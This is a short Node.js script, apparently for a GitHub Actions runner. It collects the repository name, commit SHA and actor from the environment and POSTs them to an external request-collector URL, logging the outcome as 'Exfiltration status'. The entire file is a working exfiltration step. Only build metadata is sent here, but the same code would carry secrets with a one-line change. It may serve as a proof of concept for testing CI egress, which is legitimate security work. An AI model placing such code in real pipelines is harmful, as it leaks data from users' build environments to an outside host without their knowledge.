const fetch = require('node-fetch');

(async () => {
  try {
    const payload = {
      repo:  process.env.GITHUB_REPOSITORY,
      sha:   process.env.GITHUB_SHA,
      actor: process.env.GITHUB_ACTOR,
    };

    const res = await fetch(process.env.REQUESTBIN_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    console.log('Exfiltration status:', res.status);
  } catch (e) {
    console.error('Exfiltration error:', e);
  }
})();
